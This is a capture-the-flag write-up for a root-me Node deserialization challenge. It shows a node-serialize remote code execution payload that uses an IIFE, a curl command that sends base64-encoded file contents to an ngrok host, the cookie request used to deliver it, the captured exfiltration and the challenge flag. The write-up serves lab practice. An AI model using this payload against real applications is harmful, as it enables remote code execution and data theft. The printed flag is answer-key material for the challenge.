# root-me - Node - Serialize

```js
var profile = {
 userName : function(){
 require('child_process').exec('curl http://5249-1-55-197-127.ngrok.io?c=`ls -la / | base64`', function(error, stdout, stderr) { console.log(stdout) });
 },
 passWord : "hello",
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(profile));
```

**serialize results**:
```json
{"userName":"_$$ND_FUNC$$_function(){\n require('child_process').exec('curl http://5249-1-55-197-127.ngrok.io', function(error, stdout, stderr) { console.log(stdout) });\n }","passWord":"hello"}
```

Later I figured out that we can use JavaScript’s Immediately invoked function expression (IIFE) for calling the function. If we use IIFE bracket ()after the function body, the function will get invoked when the object is created. It works similar to a Class constructor in C++.

But to prevent it get execute from our machine other than victim machine, we add it by hand and base64 encode it

**edited to get the flag**:
```json
{"userName":"_$$ND_FUNC$$_function(){\n require('child_process').exec('curl http://d657-1-55-197-127.ngrok.io?c=`cat flag/secret | base64`', function(error, stdout, stderr) { console.log(stdout) });\n }()","passWord":"hello"}
```
Notice `()` at the end of the function

**base64 encoded**:
```
eyJ1c2VyTmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe1xuIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjdXJsIGh0dHA6Ly9kNjU3LTEtNTUtMTk3LTEyNy5uZ3Jvay5pbz9jPWBjYXQgZmxhZy9zZWNyZXQgfCBiYXNlNjRgJywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7XG4gfSgpIiwicGFzc1dvcmQiOiJoZWxsbyJ9
```

And ....
```bash
curl 'http://challenge01.root-me.org:59067/' -H 'Cookie: profile=eyJ1c2VyTmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe1xuIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjdXJsIGh0dHA6Ly9kNjU3LTEtNTUtMTk3LTEyNy5uZ3Jvay5pbz9jPWBjYXQgZmxhZy9zZWNyZXQgfCBiYXNlNjRgJywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7XG4gfSgpIiwicGFzc1dvcmQiOiJoZWxsbyJ9'
```

**captured request from ngrok**:
```
GET /?c=WTNwUzNyMGQzYzBtcDRuWTFzQjRkIQo= HTTP/1.1
Host: d657-1-55-197-127.ngrok.io
User-Agent: curl/7.68.0
Accept: */*
X-Forwarded-For: 2001:bc8:35b0:c166::151
X-Forwarded-Proto: http
Accept-Encoding: gzip
```

**flag**: `Y3pS3r0d3c0mp4nY1sB4d!`
